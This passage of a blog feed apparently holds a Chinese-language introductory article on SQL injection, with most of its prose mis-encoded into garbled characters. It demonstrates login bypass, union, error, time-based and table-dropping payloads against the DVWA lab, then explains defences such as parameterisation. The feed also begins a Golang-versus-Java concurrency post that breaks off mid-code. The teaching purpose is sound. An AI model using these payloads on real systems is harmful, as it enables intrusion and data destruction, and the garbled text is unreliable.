      "content_html": "<p><img src=\"/img/posts/nick/sqli/sqli_1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<p>ç¾å¯¦ç”Ÿæ´»ä¸­ä¹Ÿå¯èƒ½ç™¼ç”Ÿ SQL Injection ? è²·é£²æ–™çš„æ™‚å€™åº—å“¡å•ä½ ç”œåº¦å†°å¡Šï¼Œä½ å»è·Ÿåº—å“¡èªªåº—é•·å·²ç¶“é€£çºŒä¸‰å€‹æœˆå¿˜è¨˜ç¹³æ°´é›»è²»ï¼Œå†ä¸äº¤å°±è¦æ–·æ°´æ–·é›»ï¼Œåº—å“¡æƒ…æ€¥ä¹‹ä¸‹ä¸ç–‘æœ‰ä»–ï¼ŒæŠŠç›ˆé¤˜æ‹¿å‡ºä¾†è«‹ä½ å¹«å¿™ç¹³æ¸…ï¼Œä½ å°±å¸¶è‘—é€™ç­†éŒ¢ä¸€èµ°äº†ä¹‹ï¼ŒSQL Injection å°±å¦‚åŒé€™è©é¨™ä¸€èˆ¬çš„è¡Œç‚ºç™¼ç”Ÿåœ¨ç¶²ç«™ä¸Šï¼Œé–‹ç™¼è€…æ²’è€ƒæ…®åˆ°æ„æ–™ä¹‹å¤–çš„è¼¸å…¥ï¼Œé§­å®¢è¶æ©Ÿå°è³‡æ–™åº«ä¸‹å‘½ä»¤ä¾†ç«Šå–æˆ–ç«„æ”¹è³‡æ–™ï¼Œç‰¹å®šç‹€æ³ä¸‹é‚„å¯ä»¥æ”»åˆ°ä¼ºæœå™¨ã€‚</p>\n<h2 id=\"%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\">#</a> å¯¦éš›æ¡ˆä¾‹</h2>\n<p>SQL Injection çœŸçš„å·²ç¶“å‡ºç¾å¾ˆä¹…äº†ï¼Œä½†å®ƒä¾ç„¶ä¸æ–·ç™¼ç”Ÿï¼Œé€™é‚Šåˆ†äº«å¹¾å€‹ç›¸é—œçš„è³‡å®‰æ–°èï¼Œé€å€‹ä»‹ç´¹çš„è©±å°±åé›¢æˆ‘å€‘å¿«é€Ÿäº†è§£çš„ç›®æ¨™ï¼Œå…ˆäº†è§£å…¶åš´é‡æ€§å³å¯ï¼Œå¦‚æœå° SQL Injection æ”»æ“Šæ‰€é€ æˆçš„å½±éŸ¿æœ‰èˆˆè¶£ï¼Œä¸ä»¿èŠ±é»æ™‚é–“çœ‹çœ‹ã€‚</p>\n<ul>\n<li>2012å¹´ Yahoo<br>\n<a href=\"https://www.inside.com.tw/article/1487-yahoo-leaked-450k-accounts\">https://www.inside.com.tw/article/1487-yahoo-leaked-450k-accounts</a></li>\n<li>2015å¹´ Joomla<br>\n<a href=\"https://thehackernews.com/2015/10/joomla-security.html\">https://thehackernews.com/2015/10/joomla-security.html</a></li>\n<li>2021å¹´ ä¸­è¯æ°‘åœ‹åœ‹é˜²éƒ¨<br>\n<a href=\"https://udn.com/news/story/10930/5238128\">https://udn.com/news/story/10930/5238128</a></li>\n</ul>\n<h2 id=\"sql-injection-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F\"><a class=\"direct-link\" href=\"#sql-injection-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F\">#</a> SQL Injection æ€éº¼ç™¼ç”Ÿ ?</h2>\n<!-- summary -->\n<p>SQL Injection çš„åŸç†å¾ˆç°¡å–®ï¼Œåˆ©ç”¨ç¶²é ç¨‹å¼è¨­è¨ˆè€…å¿½ç•¥æª¢æŸ¥ä½¿ç”¨è€…è¼¸å…¥å…§å®¹é€ æˆæ”»æ“Šï¼Œä½†åªå¾ä¸€å¥è©±å¾ˆé›£çœ‹å‡ºåˆ°åº•ç™¼ç”Ÿäº†ä»€éº¼ï¼Œä¸‹é¢ç”¨ç”Ÿæ´»åŒ–çš„ä¾‹å­ï¼Œå¸¶å¤§å®¶å¿«é€Ÿäº†è§£æ•´å€‹æµç¨‹ã€‚</p>\n<!-- summary -->\n<h3 id=\"%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B\">#</a> æ­£å¸¸æµç¨‹</h3>\n<p>äº†è§£æ”»æ“Šæµç¨‹ä¹‹å‰éœ€è¦å…ˆäº†è§£æ­£å¸¸ç¶²ç«™çš„ä½œæ¥­æµç¨‹ï¼Œé€™é‚Šå…ˆç”¨å…©å¼µåœ–ä¾†èªªæ˜ã€‚</p>\n<p><img src=\"/img/posts/nick/sqli/sqli_2.jpg\" alt=\"\"></p>\n<p><img src=\"/img/posts/nick/sqli/sqli_3.jpg\" alt=\"\"></p>\n<p>ç¶²ç«™ç™»å…¥æµç¨‹</p>\n<ol>\n<li>ç”¨æˆ¶åœ¨é é¢ä¸Šè¼¸å…¥å¸³è™Ÿå¯†ç¢¼ã€‚</li>\n<li>å‰ç«¯å°‡å¾é é¢ä¸Šå°‡è³‡æ–™æ•´ç†çµ¦å¾Œç«¯ã€‚</li>\n<li>å¾Œæ®µå°‡è³‡æ–™æ•´ç†æˆ SQL æ ¼å¼ï¼Œå‘è³‡æ–™åº«è©¢å•æ˜¯å¦å­˜åœ¨ä¸€å€‹åç¨±æ¬„ä½ç‚º admin å¯†ç¢¼æ¬„ä½ç‚º password çš„ä½¿ç”¨è€…ï¼Œå¦‚æœå­˜åœ¨çš„è©± ID æ˜¯å¤šå°‘ã€‚</li>\n<li>å¾Œç«¯å¾è³‡æ–™åº«æ‰¾åˆ°é€™å€‹ä½¿ç”¨è€…å¾Œåˆ¤æ–·è®“ç”¨æˆ¶ç™»å…¥ã€‚</li>\n<li>å‰ç«¯åœ¨é é¢ä¸Šé¡¯ç¤ºç™»å…¥æˆåŠŸã€‚</li>\n</ol>\n<h3 id=\"%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\">#</a> æ”»æ“Šæµç¨‹</h3>\n<p>SQL Injection æ”»æ“Šçš„æµç¨‹ï¼Œç¤ºç¯„å¦‚ä½•ä¸ç”¨å¯†ç¢¼å°±å¯ç™»éŒ„ç¶²ç«™ã€‚</p>\n<p><img src=\"/img/posts/nick/sqli/sqli_4.jpg\" alt=\"\"></p>\n<p>ç¶²ç«™ç™»å…¥æµç¨‹(SQL Injection)</p>\n<ol>\n<li>ç”¨æˆ¶è¼¸å…¥å¸³è™Ÿå¯†ç¢¼ã€‚</li>\n<li>å‰ç«¯å°‡è³‡æ–™æ•´ç†çµ¦å¾Œç«¯ã€‚<br>\n<font color=#FF0000></li>\n<li>å¾Œæ®µå°‡è³‡æ–™æ•´ç†æˆSQLèªæ³•æ ¼å¼ï¼Œå‘è³‡æ–™åº«è©¢å•æ˜¯å¦å­˜åœ¨ä¸€å€‹åç¨±æ¬„ä½ç‚º admin æˆ– 1=1 å’Œå¯†ç¢¼ç‚ºç©ºçš„ä½¿ç”¨è€…ï¼Œå¦‚æœå­˜åœ¨çš„è©± ID æ˜¯å¤šå°‘ã€‚</font></li>\n<li><font color=#FF0000>å¾Œç«¯å¾è³‡æ–™åº«æ‰¾ä¸åˆ°é€™å€‹ä½¿ç”¨è€…ä½†å› ç‚º 1 ç­‰æ–¼ 1 æ‰€ä»¥è®“è®“ç”¨æˆ¶ç™»å…¥ã€‚</font></li>\n<li>å‰ç«¯åœ¨é é¢ä¸Šé¡¯ç¤ºç™»å…¥æˆåŠŸã€‚</li>\n</ol>\n<p>å¾æµç¨‹ä¸­å¯ä»¥çœ‹å‡ºå› ç‚ºè¼¸å…¥ä¸­åŠ ä¸Šç¬¦è™Ÿå¾Œçµ„åˆæˆ SQL èªå¥ï¼Œå½±éŸ¿äº†æ­¥é©Ÿ 3 çš„è¼¸å…¥èˆ‡æ­¥é©Ÿ 4 çš„åˆ¤æ–·ï¼Œå› ç‚ºèˆ‡ 1=1 å–è¯é›†å°è‡´æŸ¥è©¢ä¸€å®šæˆç«‹ï¼Œæ‰€ä»¥å³ä½¿å¯†ç¢¼éŒ¯äº†ä¹Ÿå¯ä»¥æˆåŠŸç™»å…¥ã€‚æ˜é¡¯çœ‹å‡ºæ”»æ“Šè€…é€éæˆªæ–·åŸæœ¬ç¨‹å¼çš„èªæ„ï¼Œæ’å…¥ä»–å¸Œæœ›åŸ·è¡Œçš„ SQL èªæ³•ï¼Œé”æˆæ”»æ“Šçš„æ•ˆæœã€‚</p>\n<h2 id=\"sql-injection-%E6%9C%89%E5%93%AA%E4%BA%9B%E7%A8%AE%E9%A1%9E-%3F\"><a class=\"direct-link\" href=\"#sql-injection-%E6%9C%89%E5%93%AA%E4%BA%9B%E7%A8%AE%E9%A1%9E-%3F\">#</a> SQL Injection æœ‰å“ªäº›ç¨®é¡ ?</h2>\n<p>çœ‹æ‡‚æ”»æ“ŠåŸç†å¾Œæ˜¯å¦æ„Ÿè¦º SQL Injection å…¶å¯¦å¾ˆå–®ç´” ? å¯æƒœåœ¨å¯¦å‹™è¼ƒç‚ºè¤‡é›œï¼Œç•¶é–‹ç™¼è€…æƒ³å‡ºäº†æ–¹æ³•ä¾†ä¿è­·è³‡æ–™åº«å¾Œï¼Œé§­å®¢æœƒåœ¨æƒ³å‡ºæ–°çš„æ”»æ“Šæ‰‹æ³•ä¾†ç¹éï¼Œåœ¨é€™äº’ç›¸ç«¶çˆ­çš„éç¨‹ä¸­ï¼Œè¡ä¼¸å‡ºå„ç¨®èŠ±å¼æ”»æ“Šï¼Œæˆ‘å€‘é€šå¸¸ä¾æ”»æ“Šæ‰‹æ³•åˆ†æˆ 3 å¤§é¡ï¼Œæ¥è‘—åˆ©ç”¨çŸ¥åçš„é¶ç«™ DVWA åšä¸€å€‹ç°¡å–®çš„ç¤ºç¯„ã€‚</p>\n<h3 id=\"1.-in-band-sql-injection\"><a class=\"direct-link\" href=\"#1.-in-band-sql-injection\">#</a> 1. In-band SQL Injection</h3>\n<p>æœ€å¸¸è¦‹å’Œæœ€å®¹æ˜“è¢«åˆ©ç”¨çš„ä¸€ç¨®ã€‚æ”»æ“Šè€…è—‰ç”±æ’å…¥ SQL èªæ³•ä¾†å¾è³‡æ–™åº«æ”¶é›†è³‡è¨Šï¼Œä»¥æ”»æ“Šæ–¹å¼ä¾†çœ‹åˆå¯å†ç´°åˆ†ç‚ºå…©å€‹å°é¡åˆ¥ã€‚</p>\n<p>åœ¨äº†è§£æ”»æ“Šä¹‹å‰é‚„æ˜¯è¦å…ˆäº†è§£æ­£å¸¸é‹ä½œçš„ç‹€æ³ï¼Œç¯„ä¾‹ä¸­æ˜¯ä¸€å€‹æŸ¥è©¢é é¢ï¼Œè¼¸å…¥æ•´æ•¸çš„ ID å¯ä»¥é¡¯ç¤ºå‡ºå°æ‡‰çš„äººå“¡åç¨±ã€‚</p>\n<p><img src=\"/img/posts/nick/sqli/sqli_5.jpg\" alt=\"\"></p>\n<ul>\n<li>\n<p><strong>Error-based</strong></p>\n<ul>\n<li>ç°¡ä»‹: è—‰ç”±éŒ¯èª¤è¨Šæ¯ä¾†å–å¾—æƒ³è¦çš„è³‡è¨Šã€‚</li>\n<li>æ”»æ“Šç¯„ä¾‹: <code>'</code> (åˆ¥æ‡·ç–‘ä½ æ²’çœ‹éŒ¯ï¼Œåªè¦ä¸€å€‹ç¬¦è™Ÿå°±å¯èƒ½å°è‡´å•é¡Œ)</li>\n<li>æ¸¬è©¦çµæœ: è—‰ç”±éŒ¯èª¤è¨Šæ¯ä¾†å–å¾—è³‡æ–™åº«çš„é¡å‹ï¼Œä»¥ä¾¿æ–¼ä¹‹å¾Œé‡å°æ€§çš„æ”»æ“Šã€‚<br>\n<img src=\"/img/posts/nick/sqli/sqli_6.jpg\" alt=\"\"></li>\n</ul>\n</li>\n<li>\n<p><strong>Union-based</strong></p>\n<ul>\n<li>ç°¡ä»‹: å°‡å¤šç­†æŸ¥è©¢çš„çµæœè—‰ç”± UNION èªæ³•åˆä½µåˆ°å–®æ¬¡æŸ¥è©¢ä¸­ï¼Œè—‰æ­¤æŸ¥è©¢åŸæœ¬ä¸æä¾›çš„è³‡è¨Šã€‚</li>\n<li>æ”»æ“Šç¯„ä¾‹:<code>' union all select system_user(),user() #</code></li>\n<li>æ¸¬è©¦çµæœ: åœ¨åŸæœ¬çš„æŸ¥è©¢å…§å®¹ä¹‹å¤–åŠ ä¸Šå°ä¼ºæœå™¨ç”¨æˆ¶çš„æŸ¥è©¢ï¼Œç¯„ä¾‹ä¸­æˆåŠŸçš„æ‰¾å‡ºä½¿ç”¨è€…(app@localhost)ã€‚</li>\n</ul>\n<p><img src=\"/img/posts/nick/sqli/sqli_7.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"2.-inference-(blind)-sql-injection\"><a class=\"direct-link\" href=\"#2.-inference-(blind)-sql-injection\">#</a> 2. Inference (Blind) SQL Injection</h3>\n<p>éƒ¨åˆ†é é¢è¼¸å…¥å¾Œä¸¦ä¸åƒæŸ¥å°‹é é¢æœƒç›´æ¥é¡¯ç¤ºå¾è³‡æ–™åº«ä¾†çš„è³‡æ–™ï¼Œç”šè‡³æ ¹æœ¬æ²’æœ‰å›æ‡‰ ! æ‰€ä»¥æ”»æ“Šè€…éœ€è¦é å…¶ä»–è³‡è¨Šä¾†æ”»æ“Šï¼Œå› ç‚ºå¤§å¤šæ•¸ç‹€æ³ä¸‹è¦é åè¤‡çŒœæ¸¬ä¾†çŒœå–è³‡æ–™å…§å®¹ï¼Œé€™é¡å‹æ”»æ“Šåˆå¸¸è¢«ç¨±ç‚ºç›²æ¸¬ï¼Œä»¥æ”»æ“Šæ–¹å¼ä¾†çœ‹åˆå¯å†ç´°åˆ†ç‚ºå…©å€‹å°é¡åˆ¥ï¼Œåˆ†åˆ¥å°æ‡‰ç¶²ç«™æœ‰å›æ‡‰è·Ÿæ²’æœ‰å›æ‡‰çš„å…©ç¨®ç‹€æ³ã€‚</p>\n<p>åœ¨äº†è§£æ”»æ“Šä¹‹å‰é‚„æ˜¯è¦å…ˆäº†è§£æ­£å¸¸é‹ä½œçš„ç‹€æ³ï¼Œç¯„ä¾‹ä¸­æ˜¯ä¸€å€‹æŸ¥è©¢é é¢ï¼Œè¼¸å…¥æ•´æ•¸çš„ ID ä¹‹å¾Œç¶²ç«™æœƒå‘Šè¨´ä½ é€™å€‹ ID åœ¨è³‡æ–™åº«ä¸­è³‡å¦å­˜åœ¨ï¼Œæ‰€ä»¥åªæœƒå›æ‡‰æœ‰è·Ÿæ²’æœ‰ï¼Œä¸æœƒç›´æ¥é¡¯ç¤ºå¾è³‡æ–™åº«ä¸­å¾—åˆ°çš„è³‡æ–™ã€‚</p>\n<p><img src=\"/img/posts/nick/sqli/sqli_8.jpg\" alt=\"\"></p>\n<ul>\n<li>\n<p><strong>Content-based</strong></p>\n<ul>\n<li>ç°¡ä»‹: å¾é é¢çš„å…§å®¹ä¾†åˆ¤æ–·æ”»æ“Šæ˜¯å¦æˆåŠŸï¼Œæ•…éœ€èƒ½å¾é é¢ä¸Šçœ‹å‡ºåæ‡‰ã€‚</li>\n<li>æ”»æ“Šç¯„ä¾‹: <code>' ; DROP table USERS ; --</code></li>\n<li>æ¸¬è©¦çµæœ: æŸ¥è©¢ ID = 1 çš„ä½¿ç”¨è€…å·²ä¸å­˜åœ¨ï¼Œä»£è¡¨æ”»æ“Šå·²æˆåŠŸåˆªé™¤ tableã€‚</li>\n</ul>\n<p><img src=\"/img/posts/nick/sqli/sqli_9.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>Time-based</strong></p>\n<ul>\n<li>ç°¡ä»‹: å¾ç­‰å¾…æ™‚é–“ä¾†åˆ¤æ–·æ”»æ“Šæ˜¯å¦æˆåŠŸã€‚</li>\n<li>æ”»æ“Šç¯„ä¾‹: <code>1' and sleep(5)#</code></li>\n<li>æ¸¬è©¦çµæœ: å¯å¾å·¦ä¸Šè§’å¯åˆ¤æ–·å‡ºç¶²ç«™æ­£åœ¨ç­‰å¾…ï¼Œè—‰ç”±æª¢æŸ¥ç­‰å¾…æ™‚é–“æ˜¯å¦ç‚º 5 ç§’ä¾†åˆ¤æ–·æ”»æ“Šæ™‚å¦æˆåŠŸï¼ŒæˆåŠŸä»£è¡¨å¯åš Time-based ç›¸é—œçš„é€²éšæ¸¬è©¦ã€‚</li>\n</ul>\n<p><img src=\"/img/posts/nick/sqli/sqli_10.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"3.-out-of-band-sql-injection\"><a class=\"direct-link\" href=\"#3.-out-of-band-sql-injection\">#</a> 3. Out-of-band SQL Injection</h3>\n<p>è©²é¡å› ç‚ºæ”»æ“Šå‰ç½®éœ€æ±‚æ¯”è¼ƒé«˜ï¼Œæ‰€ä»¥æ¯”è¼ƒå°‘ç™¼ç”Ÿï¼Œæ”»æ“Šæ–¹å¼ä¸»è¦æ˜¯é€é SQL Injection ä¾†æ”»æ“Šèˆ‡è³‡æ–™åº«æœ‰ä¸²é€£çš„ç³»çµ±ï¼Œåƒæ˜¯ DNS Serverã€æ–‡ä»¶ç³»çµ±ã€é›»å­éƒµä»¶ç­‰ç­‰ï¼Œæ‰€ä»¥æ”»æ“Šæ–¹å¼å–æ±ºæ–¼å¾Œé¢æœ‰ä¸²é‚£äº›ç³»çµ±ï¼Œæœ¬æ¬¡æ¸¬è©¦é¶ç«™åˆ©ç”¨ docker æ¶çš„ç’°å¢ƒç›¸å°å–®ç´”ï¼Œæ²’æœ‰é€™é¡å‹çš„å•é¡Œã€‚</p>\n<p>ç™¼ç”Ÿæ©Ÿæœƒä½ä¸ä»£è¡¨å•é¡Œä¸æœƒç™¼ç”Ÿï¼Œå› ç‚ºç¼ºç¯„ä¾‹é€™é‚Šè£œä¸Šä¸€ç¯‡è¿‘æœŸå¾ SQL æ‰“åˆ° DNS çš„è³‡å®‰æ–°èã€‚</p>\n<p><strong><a href=\"https://www.cna.com.tw/news/aipl/202101270075.aspx\" title=\"Title\">æ”¿åºœç¶²è·¯é‡è¥²ä¸Šæœˆè¿‘10è¬ä»¶ éæ ¸å¿ƒç³»çµ±ä¹Ÿæˆç›®æ¨™</a></strong><br>\n<img src=\"/img/posts/nick/sqli/sqli_11.jpg\" alt=\"\"></p>\n<h2 id=\"%E7%B8%BD%E7%B5%90%3A\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90%3A\">#</a> ç¸½çµ:</h2>\n<p>SQL Injection ç•¢ç«Ÿæ˜¯ç”±ä½¿ç”¨è€…è¼¸å…¥æ‰€å°è‡´çš„å•é¡Œï¼Œè¦è§£æ±ºç•¶ç„¶ä¹Ÿè¦å¾è¼¸å…¥ä¸‹æ‰‹ã€‚</p>\n<p><strong>è§£æ±ºæ–¹æ¡ˆï¼ˆä¸€ï¼‰ :  è¼¸å…¥éæ¿¾</strong></p>\n<p>éæ¿¾è¼¸å…¥æ˜¯æœ€å¸¸è¦‹çš„é˜²ç¯„æ–¹æ³•ï¼Œè—‰ç”±æª¢æŸ¥ SQL èªæ³•ä¸­æœ‰æ„ç¾©çš„ç¬¦è™Ÿä¾†é¿å…èªæ„è¢«ç«„æ”¹ï¼Œä½†è¦ç‰¹åˆ¥æ³¨æ„å…©é»ï¼Œç¬¬ä¸€æ˜¯å¿…é ˆåœ¨å¾Œç«¯é€²è¡Œéæ¿¾ï¼Œå› ç‚ºé§­å®¢æœ‰å¤ªå¤šæ©Ÿæœƒç¹éå‰ç«¯æª¢æŸ¥ï¼Œç¬¬äºŒæ˜¯é¿å…ç”¨é»‘åå–®çš„æ–¹å¼éæ¿¾ï¼Œå› ç‚ºé§­å®¢æœƒå˜—è©¦ç”¨åˆæ³•çš„å­—å…ƒä¾†çµ„åˆå‡ºè©²è¢«éæ¿¾æ‰çš„ç¬¦è™Ÿï¼Œç”¨ç™½åå–®å¯ä»¥å°‡é€™å€‹å•é¡Œçš„ç™¼ç”Ÿæ©Ÿç‡é™åˆ°æœ€ä½ï¼Œä¸éç™½åå–®åªé©åˆç”¨åœ¨è¼¸å…¥è¼ƒç‚ºå–®ç´”çš„ç¶²ç«™ï¼Œå¦‚æœç¶²ç«™çš„è¼¸å…¥è¼ƒè¤‡é›œæˆ–è€…å¿…é ˆåŒ…å«ç¬¦è™Ÿï¼Œå»ºè­°æ”¹ç”¨å…¶ä»–æ–¹æ³•ã€‚</p>\n<p><strong>è§£æ±ºæ–¹æ¡ˆï¼ˆäºŒï¼‰ :  åƒæ•¸åŒ–</strong></p>\n<p>é™åˆ¶è¼¸å…¥åƒ…å«åƒæ•¸ä¸å«èªæ³•ï¼Œæ¥è‘—åœ¨è¼¸å…¥å¾Œç«‹åˆ»è½‰æ›è¼¸å…¥æ ¼å¼ã€‚</p>\n<p>ä»¥é–‹é ­çš„å…å¯†ç¢¼ç™»å…¥æ”»æ“Šä¾†èˆ‰ä¾‹ï¼Œå¯¦éš›ä¸Šè³‡æ–™åº«æ”¶åˆ°çš„ SQL èªå¥å¦‚ä¸‹ã€‚</p>\n<pre><code>SELECT ID FROM Accounts WHERE user ='admin or '1'=1' and 'pass'='';\n</code></pre>\n<p>å¦‚æœåœ¨å…ˆè½‰æ›è¼¸å…¥å…§å®¹è½‰æ›ç‚ºå­—ä¸²å†æ”¾å…¥ SQL èªå¥ã€‚</p>\n<pre><code>SELECT ID FROM Accounts WHERE user=&quot;admin\\' or \\'1\\'=\\'1&quot; and 'pass'=&quot;&quot;;\n</code></pre>\n<p>é€™æ™‚æœƒå»æª¢æŸ¥æœ‰æ²’æœ‰ä¸€å€‹åç¨±ç‚º <font color=#FF0000>admin' or '1'='1 </font>çš„å¸³è™Ÿï¼Œçµæœç•¶ç„¶æ˜¯æ‰¾ä¸åˆ°æ”»æ“Šä¹Ÿå¤±æ•ˆï¼Œé€™ç¨®æ–¹æ³•æ¯”è¼ƒé€šç”¨ï¼Œä¸éè¦æ³¨æ„è½‰æ›å¤±æ•—æ™‚çš„ä¾‹å¤–è™•ç†ï¼Œéƒ¨åˆ†ç¨‹å¼èªè¨€æœƒç›´æ¥ crashï¼Œå½±éŸ¿åˆ°ç¶²ç«™æœå‹™ã€‚</p>\n<p><strong>è§£æ±ºæ–¹æ¡ˆï¼ˆä¸‰ï¼‰ : è³‡æ–™åº«å¥—ä»¶</strong></p>\n<p>å…¶å¯¦é€™å€‹è§£æ±ºæ–¹æ¡ˆæ˜¯å‰å…©å€‹å®‰æ¡ˆçš„å»¶ä¼¸ï¼Œæœ‰ä¸€äº›å¥—ä»¶å·²ç¶“å¹«ä½ åšå®Œä¸Šè¿°å…©ä»¶äº‹æƒ…ï¼Œæ‰€ä»¥é€éå¥—ä»¶ä¾†å‘¼å«è³‡æ–™åº«å¯é˜²æ­¢æ”»æ“Šç™¼ç”Ÿï¼Œå¸¸è¦‹çš„åƒæ˜¯ JAVA çš„ JDBC å¥—ä»¶ï¼Œå…¶ä»–ç¨‹å¼èªè¨€ä¹Ÿæœ‰é¡ä¼¼çš„å¥—ä»¶ï¼Œä½†ä½¿ç”¨å‰å‹™å¿…åšå¥½åŠŸèª²ï¼Œé¿å…ç”¨äº†ä¸å®‰å…¨çš„å¥—ä»¶å°è‡´ç¶²ç«™é‚„æ˜¯å—åˆ°æ”»æ“Šã€‚</p>\n<br>\n<p>å‰é¢ç‚ºå¿«é€Ÿèªªæ˜åŸç†æŒ‘äº†ä¸€äº›ç°¡å–®æ˜“æ‡‚çš„æ”»æ“Šä¾†ç¤ºç¯„ï¼Œå¯¦éš›ä¸Šé‚„æœ‰æ›´å¤šé€²éšçš„æ”»æ“Šæ‰‹æ³•ï¼Œå¦‚æœé–±è¦½æ•¸é‡å¤ å¤šï¼Œä¹‹å¾Œæœƒå†åŠ é–‹ä¸€ç¯‡åˆ†äº«ä¸€äº›æ›´é€²éšçš„ç”¨æ³•èˆ‡ç¶“å…¸æ¡ˆä¾‹ï¼Œæœ‰ä»»ä½•è³‡å®‰æ–¹é¢ç›¸é—œçš„å•é¡Œéƒ½æ­¡è¿ç•™è¨€è¨è«–ï¼Œæˆ–è€…ç›´æ¥åˆ° Cymetrics å°‹æ±‚å”åŠ©ã€‚</p>\n",
      "date_published": "2021-08-31T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-zh/",
      "title": "ä¸¦è¡Œç¨‹å¼å…¸ç¯„ (Paradigms): Golang V.S.Â Java",
      "content_html": "<!-- summary -->\n<p>ç•¶æˆ‘å›é ­çœ‹å‰›é–‹å§‹å­¸ Golang çš„ç¨‹å¼æ™‚ï¼Œæˆ‘ç™¼ç¾æˆ‘åªæ˜¯ç”¨ Golang èªæ³•å¯« Java ç¨‹å¼ã€‚å°¤å…¶åœ¨ä¸¦è¡Œç¨‹å¼çš„è¨­è¨ˆæ€è·¯ä¸Š Golang å’Œ Java å®Œå…¨ä¸åŒï¼šJava ç¿’æ…£ä¸Šæœƒç”¨ thread-safe çš„æ¦‚å¿µè¨­è¨ˆä¸¦è¡Œï¼Œè€Œ Golang çš„è¨­è¨ˆä¸Šé¼“å‹µé–‹ç™¼è€…ä½¿ç”¨ channel è™•ç†ä¸¦è¡Œå•é¡Œã€‚</p>\n<!-- summary -->\n<p>é€™ç¯‡æ–‡ç« ä¸»è¦æƒ³è¨è«– Java å’Œ Golang æ’°å¯«ä¸¦è¡Œç¨‹å¼ä¸Šçš„é¢¨æ ¼å·®ç•°ï¼Œå¸Œæœ›èƒ½è®“åˆå­¸ Golang çš„é–‹ç™¼è€…åœ¨æ’°å¯«ä¸¦è¡Œæ™‚ï¼Œèƒ½å° Golang çš„ä¸¦è¡Œè¨­è¨ˆæ¨¡å¼æœ‰äº›æ¦‚å¿µã€‚</p>\n<h1 id=\"%E4%BB%80%E9%BA%BC%E6%98%AF%E5%85%B8%E7%AF%84\"><a class=\"direct-link\" href=\"#%E4%BB%80%E9%BA%BC%E6%98%AF%E5%85%B8%E7%AF%84\">#</a> ä»€éº¼æ˜¯å…¸ç¯„</h1>\n<p>ç¨‹å¼å…¸ç¯„æ˜¯æŒ‡è¦ç¯„å¦‚ä½•æ’°å¯«ç¨‹å¼çš„æŒ‡å°åŸå‰‡ï¼Œä¸€ç¨®æ›´é«˜ä½çš„è¨­è¨ˆæ¨¡å¼ï¼Œ åƒæ˜¯ç‰©ä»¶å°å‘ç¨‹å¼è¨­è¨ˆ (Object Oriented Programming) å°±æ˜¯ä¸€ç¨®ç¨‹å¼å…¸ç¯„ï¼Œå…¶é¤˜çš„é‚„æœ‰å‡½å¼èªè¨€ç¨‹å¼è¨­è¨ˆ (Functional programming)ã€‚<br>\nè¦æ³¨æ„çš„æ˜¯ï¼Œå…¸ç¯„æœ¬èº«ä¸¦ç„¡å„ªåŠ£ä¹‹åˆ†ï¼Œæœ‰çš„åªæ˜¯é©ç”¨çš„æƒ…å¢ƒä¸åŒã€‚<br>\nå¦‚åŒç¨‹å¼ä¸¦è¡Œå…¸ç¯„ï¼Œæ’°å¯«ä¸¦è¡Œç¨‹å¼ä¹Ÿæœ‰å…¸ç¯„ï¼Œå¦‚ Thread &amp; Lock å°±æ˜¯ä¸€ç¨®ä¸¦è¡Œçš„å…¸ç¯„ã€‚Java åœ¨æ’°å¯«ä¸¦è¡Œç¨‹å¼æ™‚å³æ˜¯ä¾å¾ª Thread &amp; Lockã€‚å¦ä¸€æ–¹é¢ï¼Œ Golang çš„ä¸¦è¡Œå…¸ç¯„å‰‡æ›´å¤šæ˜¯éµå¾ª Communicating Sequential Process(CSP) ã€‚æ¥ä¸‹ä¾†è®“æˆ‘å€‘æ›´æ·±å…¥æ¢è¨å…©ç¨®å…¸ç¯„çš„å·®ç•°ã€‚</p>\n<h1 id=\"thread-%26-lock\"><a class=\"direct-link\" href=\"#thread-%26-lock\">#</a> Thread &amp;Â Lock</h1>\n<p>Thread &amp; Lock åœ¨é‹ä½œä¸Šå®Œå…¨åæ˜ åº•å±¤ç¡¬é«”çš„è¡Œç‚ºã€‚åŸºæœ¬ä¸Šæ˜¯ä¸åŒ Thread é€éå…±äº«è¨˜æ†¶é«”æºé€šï¼Œè€Œé€é Lock ç¢ºä¿ä¸€æ¬¡åªæœ‰å€‹ Thread å­˜å–å…±äº«è¨˜æ†¶é«”ï¼Œå³æ˜¯äº’æ–¥é–çš„æ¦‚å¿µï¼š<br>\n<img src=\"/img/posts/genchilu/concurrency_paradigms_golang_and_Java/thread_and_lock.png\" alt=\"\"></p>\n<p>ä»¥ç¶“å…¸çš„åŒæ­¥å•é¡Œâ€Š-â€Šç”Ÿç”¢è€…/æ¶ˆè²»è€…å•é¡Œç‚ºä¾‹ï¼ŒJava å¯¦ä½œèµ·ä¾†æœƒåƒé€™æ¨£ï¼š</p>\n<pre class=\"language-java\"><code class=\"language-java\">    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Lock</span> lock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ReentrantLock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Queue</span> queue <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token 